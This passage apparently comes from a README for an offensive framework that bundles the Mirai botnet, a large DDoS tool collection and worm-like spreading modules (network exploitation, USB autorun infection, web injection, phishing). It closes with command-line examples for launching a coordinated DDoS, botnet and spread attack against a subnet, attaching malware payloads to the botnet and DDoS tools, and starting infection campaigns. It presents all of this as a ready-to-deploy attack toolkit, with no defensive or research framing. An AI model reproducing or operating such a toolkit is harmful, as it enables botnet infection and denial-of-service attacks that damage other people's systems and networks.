- **DDOS Tools Collection**: Full DDOS-RootSec arsenal (2000+ files)
- **Spread Mechanisms**: Network scanning, USB propagation, web infections
- **Payload Management**: Sophisticated attachment and deployment system

### Advanced Features Implemented
- **Multi-Vector Attacks**: Botnet + DDOS + Spread coordination
- **Cross-Platform Support**: x86_64, ARM, MIPS architectures
- **Real-time Monitoring**: Live dashboard and process health checks
- **Automated Building**: Cross-compilation and release packaging
- **Interactive & CLI Modes**: Comprehensive command interface

### Spread Capabilities (Advanced "Spread Feature")
- **Network-based**: Automated vulnerability scanning and exploitation
- **USB Propagation**: Physical media infection with autorun
- **Web Infections**: SQL injection, XSS, file upload attacks
- **Email Vectors**: Phishing campaigns and attachment deployment
- **Social Engineering**: Human-targeted attack vectors
- **Payload Attachment**: Seamless integration with Mirai and DDOS tools

- **Automated Building**: Complete build system with dependencies
- **Release Packaging**: Compressed archives with checksums
- **Easy Installation**: One-command setup and deployment

## Framework Statistics

- **Total Files**: 2,046 files integrated
- **Source Lines**: 3.7M+ lines of code
- **Modules**: 4 core modules (Mirai, DDOS, Spread, Payloads)
- **Attack Methods**: 100+ DDOS attack vectors
- **Spread Mechanisms**: 5 propagation methods
- **Architecture Support**: 3 target platforms
- **Package Size**: 2.4GB comprehensive release

## Usage Examples

### Quick Start
```bash
# Load and coordinate all modules
./launcher/unified_launcher.py load mirai
./launcher/unified_launcher.py load ddos
./launcher/unified_launcher.py load spread

# Launch coordinated attack with spread
./launcher/unified_launcher.py attack 192.168.1.0/24 \
 --methods ddos botnet spread --intensity high
```

### Spread Integration
```bash
# Attach payload to Mirai botnet
./launcher/unified_launcher.py spread attach-mirai \
 --payload /path/to/malware.bin

# Attach payload to DDOS tools
./launcher/unified_launcher.py spread attach-ddos \
 --payload /path/to/payload.exe --tools slowloris hulk

# Launch standalone spread campaign
./launcher/unified_launcher.py campaign start \
 --config campaign.json
```

### Interactive Mode
```
 unified-framework> status
 unified-framework> load mirai
 unified-framework> start mirai --port 23
 unified-framework> spread attach-mirai --payload payload.bin
```
